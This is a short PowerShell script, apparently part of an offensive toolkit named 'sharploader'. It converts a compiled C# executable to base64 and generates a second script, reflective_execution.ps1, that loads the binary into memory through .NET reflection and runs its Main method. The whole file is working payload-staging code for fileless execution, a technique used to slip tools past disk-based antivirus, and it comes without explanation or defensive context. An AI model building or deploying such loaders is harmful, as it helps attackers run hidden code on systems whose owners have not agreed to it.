param($folder)

. $PSScriptRoot\shared_functions.ps1

function sharploader-generatepowershell {
    param($folder)

    $file = "$folder\csharpbin.exe"
    ConvertTo-Base64 -SourceFilePath $file -TargetFilePath "$folder\file.txt"
    $binary = get-content "$folder\file.txt"

    $payload = '
        $payload = "'+$binary+'"
        $data = [System.Convert]::FromBase64String($payload)
        $assem = [System.Reflection.Assembly]::Load($data);
        [Sharploader.Program]::Main()
    '

    Remove-Item "$folder\file.txt" -force
    New-Item -Path "$folder" -Name "reflective_execution.ps1" -ItemType "file" -Value $payload -force

}

$n = $MyInvocation.MyCommand.Name
console -text "Executed: $n" -type "ok"
$output = sharploader-generatepowershell -folder $folder

